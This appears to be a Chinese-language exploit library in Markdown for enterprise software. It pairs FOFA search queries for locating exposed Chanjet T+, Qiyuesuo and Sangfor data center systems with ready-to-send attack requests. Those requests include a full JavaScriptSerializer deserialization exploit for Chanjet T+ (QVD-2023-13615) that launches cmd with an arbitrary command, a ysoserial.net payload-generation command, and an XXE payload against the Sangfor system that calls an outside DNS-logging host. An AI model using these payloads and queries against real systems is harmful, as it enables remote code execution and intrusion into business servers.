## 这里就是漏洞库了

### 用友畅捷通T
- fofa语法：`app="畅捷通-TPlus"`

#### 畅捷通T+ 反序列化漏洞（QVD-2023-13615）

该漏洞属于.net反序列化场景中的 JavaScriptSerializer反序列化；

简介：在.NET处理 Ajax应用的时候，通常序列化功能由JavaSerializer类提供，它是.NET2.0之后内部实现的序列化功能的类，位于命名空间System.Web..Serialization、通过System.Web.Extensions引用，让开发者轻松实现.Net中所有类型和Json数据之间的转换，但在某些场景下开发者使用Deserialize 或DeserializeObject方法处理不安全的Json数据时会造成反序列化攻击从而实现远程RCE漏洞。

- POC
  ```
  POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
  Host: your-ip
  X-Ajaxpro-Method: GetStoreWarehouseByStore
  
  {
  "storeID":{}
  }
  ```

- PS:`X-Ajaxpro-Method`：用于指定在Ajax请求中要调用的服务器端方法的名称

![这是一张图片](/images/QVD-2023-13615/1.png)

- 出现这种情况，则存在漏洞  
  使用ysoserial.net工具构造payload（攻击链：ObjectDataProvider）

- `./ysoserial.exe -f JavaScriptSerializer -g ObjectDataProvider -c "执行的命令"`

  ![这是一张图片](/images/QVD-2023-13615/2.png)

- 将生成的序列化数据加载到PoC中（PS：需要将里面的单引号替换成双引号）

  ![这是一张图片](/images/QVD-2023-13615/3.png)

- exp：
  ```
  POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
  Host: your-ip
  X-Ajaxpro-Method: GetStoreWarehouseByStore

  {
  "storeID":{
      "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
      "MethodName":"Start",
      "ObjectInstance":{
          "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
          "StartInfo": {
              "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
              "FileName":"cmd", "Arguments":"/c 执行的命令"
          }
      }
  }
  }
  ```
  ![这是一张图片](/images/QVD-2023-13615/4.png)

  ![Alt text](/images/QVD-2023-13615/5.png)

- [相关链接](https://blog.csdn.net/qq_41904294/article/details/131350965)

------

### 契约锁

- fofa语法：`app="契约锁-电子签署平台"`

------

### 深信服 DC数据中心管理系统

- fofa语法：`app="SANGFOR-数据中心"`

#### 深信服数据中心管理系统 XXE漏洞

- POC
  ```
  POST /src/sangforindex HTTP/1.1
  Host: your-ip
  Content-Type: text/xml
  
  <?xml version="1.0" encoding="utf-8" ?>
  <!DOCTYPE root [
      <!ENTITY rt SYSTEM "http://dnslog.cn">
  ]>
  <xxx>
  &rt;
  </xxx>
  ```

- 验证

![Alt text](/images/深信服/1.png)

![Alt text](/images/深信服/2.png)

[相关链接](https://blog.csdn.net/qq_41904294/article/details/132310337)

------
